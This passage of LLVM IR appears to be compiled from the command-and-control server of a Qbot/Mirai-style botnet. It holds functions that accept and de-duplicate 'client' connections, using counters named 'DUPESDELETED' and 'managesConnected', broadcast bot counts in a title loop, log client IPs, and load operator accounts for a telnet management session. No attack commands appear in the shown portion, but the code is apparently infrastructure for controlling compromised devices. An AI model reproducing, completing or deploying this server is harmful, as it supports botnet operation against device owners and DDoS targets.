  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i32 0, i32 1
  %71 = bitcast %union.epoll_data* %70 to i32*
  %72 = load i32, i32* %71, align 1
  %73 = call i32 @close(i32 noundef %72)
  br label %252

74:                                               ; preds = %46
  %75 = load volatile i32, i32* @listenFD, align 4
  %76 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %77 = load i32, i32* %7, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %76, i64 %78
  %80 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i32 0, i32 1
  %81 = bitcast %union.epoll_data* %80 to i32*
  %82 = load i32, i32* %81, align 1
  %83 = icmp eq i32 %75, %82
  br i1 %83, label %84, label %176

84:                                               ; preds = %74
  br label %85

85:                                               ; preds = %168, %144, %84
  store i32 16, i32* %9, align 4
  %86 = load volatile i32, i32* @listenFD, align 4
  %87 = call i32 @accept(i32 noundef %86, %struct.sockaddr* noundef %8, i32* noundef %9)
  store i32 %87, i32* %10, align 4
  %88 = load i32, i32* %10, align 4
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %100

90:                                               ; preds = %85
  %91 = call i32* @__errno_location() #10
  %92 = load i32, i32* %91, align 4
  %93 = icmp eq i32 %92, 11
  br i1 %93, label %98, label %94

94:                                               ; preds = %90
  %95 = call i32* @__errno_location() #10
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 11
  br i1 %97, label %98, label %99

98:                                               ; preds = %94, %90
  br label %175

99:                                               ; preds = %94
  call void @perror(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %175

100:                                              ; preds = %85
  %101 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %101, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 2
  %105 = load i32, i32* %10, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %106
  %108 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %107, i32 0, i32 0
  store i32 %104, i32* %108, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %109

109:                                              ; preds = %138, %100
  %110 = load i32, i32* %11, align 4
  %111 = icmp slt i32 %110, 1000000
  br i1 %111, label %112, label %141

112:                                              ; preds = %109
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %115, i32 0, i32 2
  %117 = load i8, i8* %116, align 1
  %118 = icmp ne i8 %117, 0
  br i1 %118, label %119, label %123

119:                                              ; preds = %112
  %120 = load i32, i32* %11, align 4
  %121 = load i32, i32* %10, align 4
  %122 = icmp eq i32 %120, %121
  br i1 %122, label %123, label %124

123:                                              ; preds = %119, %112
  br label %138

124:                                              ; preds = %119
  %125 = load i32, i32* %11, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %126
  %128 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %127, i32 0, i32 0
  %129 = load i32, i32* %128, align 4
  %130 = load i32, i32* %10, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %131
  %133 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 4
  %135 = icmp eq i32 %129, %134
  br i1 %135, label %136, label %137

136:                                              ; preds = %124
  store i32 1, i32* %12, align 4
  br label %141

137:                                              ; preds = %124
  br label %138

138:                                              ; preds = %137, %123
  %139 = load i32, i32* %11, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %11, align 4
  br label %109, !llvm.loop !12

141:                                              ; preds = %136, %109
  %142 = load i32, i32* %12, align 4
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %144, label %147

144:                                              ; preds = %141
  %145 = load volatile i32, i32* @DUPESDELETED, align 4
  %146 = add nsw i32 %145, 1
  store volatile i32 %146, i32* @DUPESDELETED, align 4
  br label %85

147:                                              ; preds = %141
  %148 = load i32, i32* %10, align 4
  %149 = call i32 @make_socket_non_blocking(i32 noundef %148)
  store i32 %149, i32* %5, align 4
  %150 = load i32, i32* %5, align 4
  %151 = icmp eq i32 %150, -1
  br i1 %151, label %152, label %155

152:                                              ; preds = %147
  %153 = load i32, i32* %10, align 4
  %154 = call i32 @close(i32 noundef %153)
  br label %175

155:                                              ; preds = %147
  %156 = load i32, i32* %10, align 4
  %157 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %158 = bitcast %union.epoll_data* %157 to i32*
  store i32 %156, i32* %158, align 1
  %159 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %159, align 1
  %160 = load volatile i32, i32* @epollFD, align 4
  %161 = load i32, i32* %10, align 4
  %162 = call i32 @epoll_ctl(i32 noundef %160, i32 noundef 1, i32 noundef %161, %struct.epoll_event* noundef %3) #9
  store i32 %162, i32* %5, align 4
  %163 = load i32, i32* %5, align 4
  %164 = icmp eq i32 %163, -1
  br i1 %164, label %165, label %168

165:                                              ; preds = %155
  call void @perror(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  %166 = load i32, i32* %10, align 4
  %167 = call i32 @close(i32 noundef %166)
  br label %175

168:                                              ; preds = %155
  %169 = load i32, i32* %10, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %170
  %172 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %171, i32 0, i32 2
  store i8 1, i8* %172, align 1
  %173 = load i32, i32* %10, align 4
  %174 = call i64 @send(i32 noundef %173, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i64 noundef 9, i32 noundef 16384)
  br label %85

175:                                              ; preds = %165, %152, %99, %98
  br label %252

176:                                              ; preds = %74
  %177 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %178 = load i32, i32* %7, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %177, i64 %179
  %181 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %180, i32 0, i32 1
  %182 = bitcast %union.epoll_data* %181 to i32*
  %183 = load i32, i32* %182, align 1
  store i32 %183, i32* %13, align 4
  %184 = load i32, i32* %13, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %185
  store %struct.clientdata_t* %186, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %187 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %188 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %187, i32 0, i32 2
  store i8 1, i8* %188, align 1
  br label %189

189:                                              ; preds = %240, %176
  %190 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %190, i8 0, i64 2048, i1 false)
  br label %191

191:                                              ; preds = %223, %222, %217, %189
  %192 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %192, i8 0, i64 2048, i1 false)
  %193 = icmp ne i8* %192, null
  br i1 %193, label %194, label %200

194:                                              ; preds = %191
  %195 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %196 = load i32, i32* %13, align 4
  %197 = call i32 @fdgets(i8* noundef %195, i32 noundef 2048, i32 noundef %196)
  %198 = sext i32 %197 to i64
  store i64 %198, i64* %16, align 8
  %199 = icmp sgt i64 %198, 0
  br label %200

200:                                              ; preds = %194, %191
  %201 = phi i1 [ false, %191 ], [ %199, %194 ]
  br i1 %201, label %202, label %226

202:                                              ; preds = %200
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %204 = call i8* @strstr(i8* noundef %203, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #8
  %205 = icmp eq i8* %204, null
  br i1 %205, label %206, label %207

206:                                              ; preds = %202
  store i32 1, i32* %15, align 4
  br label %226

207:                                              ; preds = %202
  %208 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* noundef %208)
  %209 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %210 = call i32 @strcmp(i8* noundef %209, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %211 = icmp eq i32 %210, 0
  br i1 %211, label %212, label %218

212:                                              ; preds = %207
  %213 = load i32, i32* %13, align 4
  %214 = call i64 @send(i32 noundef %213, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i64 noundef 5, i32 noundef 16384)
  %215 = icmp eq i64 %214, -1
  br i1 %215, label %216, label %217

216:                                              ; preds = %212
  store i32 1, i32* %15, align 4
  br label %226

217:                                              ; preds = %212
  br label %191, !llvm.loop !13

218:                                              ; preds = %207
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %220 = call i32 @strcmp(i8* noundef %219, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #8
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %223

222:                                              ; preds = %218
  br label %191, !llvm.loop !13

223:                                              ; preds = %218
  %224 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %225 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0), i8* noundef %224)
  br label %191, !llvm.loop !13

226:                                              ; preds = %216, %206, %200
  %227 = load i64, i64* %16, align 8
  %228 = icmp eq i64 %227, -1
  br i1 %228, label %229, label %235

229:                                              ; preds = %226
  %230 = call i32* @__errno_location() #10
  %231 = load i32, i32* %230, align 4
  %232 = icmp ne i32 %231, 11
  br i1 %232, label %233, label %234

233:                                              ; preds = %229
  store i32 1, i32* %15, align 4
  br label %234

234:                                              ; preds = %233, %229
  br label %241

235:                                              ; preds = %226
  %236 = load i64, i64* %16, align 8
  %237 = icmp eq i64 %236, 0
  br i1 %237, label %238, label %239

238:                                              ; preds = %235
  store i32 1, i32* %15, align 4
  br label %241

239:                                              ; preds = %235
  br label %240

240:                                              ; preds = %239
  br label %189

241:                                              ; preds = %238, %234
  %242 = load i32, i32* %15, align 4
  %243 = icmp ne i32 %242, 0
  br i1 %243, label %244, label %249

244:                                              ; preds = %241
  %245 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %246 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %245, i32 0, i32 2
  store i8 0, i8* %246, align 1
  %247 = load i32, i32* %13, align 4
  %248 = call i32 @close(i32 noundef %247)
  br label %249

249:                                              ; preds = %244, %241
  br label %250

250:                                              ; preds = %249
  br label %251

251:                                              ; preds = %250
  br label %252

252:                                              ; preds = %251, %175, %55
  %253 = load i32, i32* %7, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %7, align 4
  br label %24, !llvm.loop !14

255:                                              ; preds = %24
  br label %20
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #3

declare i32 @epoll_wait(i32 noundef, %struct.epoll_event* noundef, i32 noundef, i32 noundef) #1

declare i32 @close(i32 noundef) #1

declare i32 @accept(i32 noundef, %struct.sockaddr* noundef, i32* noundef) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 noundef %6, i32 noundef 3, i32 noundef 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 noundef %14, i32 noundef 4, i32 noundef %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32 noundef, i32 noundef, i32 noundef, %struct.epoll_event* noundef) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #2

declare i32 @printf(i8* noundef, ...) #1

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @titleWriter(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %20, %1
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @clientsConnected()
  %11 = load volatile i32, i32* @managesConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %9, i8* noundef getelementptr inbounds ([42 x i8], [42 x i8]* @.str.12, i64 0, i64 0), i32 noundef 27, i32 noundef %10, i32 noundef %11, i32 noundef 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* noundef %15) #8
  %17 = call i64 @send(i32 noundef %13, i8* noundef %14, i64 noundef %16, i32 noundef 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  br label %20

20:                                               ; preds = %19, %7
  %21 = call i32 @sleep(i32 noundef 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* noundef, i8* noundef, ...) #3

declare i32 @sleep(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @Search_in_File(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* noundef %14, i32 noundef 512, %struct._IO_FILE* noundef %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* noundef %19, i8* noundef %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* noundef %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8* noundef, i8* noundef) #1

declare i8* @fgets(i8* noundef, i32 noundef, %struct._IO_FILE* noundef) #1

declare i32 @fclose(%struct._IO_FILE* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @client_addr(i64 %0, i64 %1) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = and i32 %10, 255
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = and i32 %14, 65280
  %16 = lshr i32 %15, 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 4
  %20 = and i32 %19, 16711680
  %21 = lshr i32 %20, 16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = and i32 %24, -16777216
  %26 = lshr i32 %25, 24
  %27 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0), i32 noundef %11, i32 noundef %16, i32 noundef %21, i32 noundef %26)
  %28 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %4, align 8
  %29 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = and i32 %32, 255
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = and i32 %36, 65280
  %38 = lshr i32 %37, 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %40 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 16711680
  %43 = lshr i32 %42, 16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, -16777216
  %48 = lshr i32 %47, 24
  %49 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %29, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0), i32 noundef %33, i32 noundef %38, i32 noundef %43, i32 noundef %48)
  %50 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %51 = call i32 @fclose(%struct._IO_FILE* noundef %50)
  ret void
}

declare i32 @fprintf(%struct._IO_FILE* noundef, i8* noundef, ...) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @telnetWorker(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [80 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [80 x i8], align 16
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca %struct._IO_FILE*, align 8
  %32 = alloca %struct._IO_FILE*, align 8
  %33 = alloca %struct._IO_FILE*, align 8
  %34 = alloca %struct._IO_FILE*, align 8
  %35 = alloca %struct._IO_FILE*, align 8
  %36 = alloca %struct._IO_FILE*, align 8
  %37 = alloca %struct._IO_FILE*, align 8
  %38 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %39 = load i8*, i8** %3, align 8
  %40 = ptrtoint i8* %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load volatile i32, i32* @managesConnected, align 4
  %42 = add nsw i32 %41, 1
  store volatile i32 %42, i32* @managesConnected, align 4
  %43 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %43, i8 0, i64 2048, i1 false)
  %44 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %44, i8 0, i64 2048, i1 false)
  %45 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %45, i8 0, i64 2048, i1 false)
  store i32 0, i32* %15, align 4
  %46 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  store %struct._IO_FILE* %46, %struct._IO_FILE** %14, align 8
  br label %47

47:                                               ; preds = %52, %1
  %48 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %49 = call i32 @feof(%struct._IO_FILE* noundef %48) #9
  %50 = icmp ne i32 %49, 0
  %51 = xor i1 %50, true
  br i1 %51, label %52, label %57

52:                                               ; preds = %47
  %53 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %54 = call i32 @fgetc(%struct._IO_FILE* noundef %53)
  store i32 %54, i32* %16, align 4
  %55 = load i32, i32* %15, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %15, align 4
  br label %47, !llvm.loop !17

57:                                               ; preds = %47
  store i32 0, i32* %17, align 4
  %58 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* noundef %58)
  br label %59

59:                                               ; preds = %64, %57
  %60 = load i32, i32* %17, align 4
  %61 = load i32, i32* %15, align 4
  %62 = sub nsw i32 %61, 1
  %63 = icmp ne i32 %60, %62
  br i1 %63, label %64, label %79

64:                                               ; preds = %59
  %65 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %66 = load i32, i32* %17, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %67
  %69 = getelementptr inbounds %struct.account, %struct.account* %68, i32 0, i32 0
  %70 = getelementptr inbounds [20 x i8], [20 x i8]* %69, i64 0, i64 0
  %71 = load i32, i32* %17, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %72
  %74 = getelementptr inbounds %struct.account, %struct.account* %73, i32 0, i32 1
  %75 = getelementptr inbounds [20 x i8], [20 x i8]* %74, i64 0, i64 0
  %76 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* noundef %65, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i8* noundef %70, i8* noundef %75)
  %77 = load i32, i32* %17, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %17, align 4
  br label %59, !llvm.loop !18

79:                                               ; preds = %59
  %80 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %81 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %80, i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.20, i64 0, i64 0)) #9
  %82 = load i32, i32* %4, align 4
  %83 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %84 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %85 = call i64 @strlen(i8* noundef %84) #8
  %86 = call i64 @send(i32 noundef %82, i8* noundef %83, i64 noundef %85, i32 noundef 16384)
  %87 = icmp eq i64 %86, -1
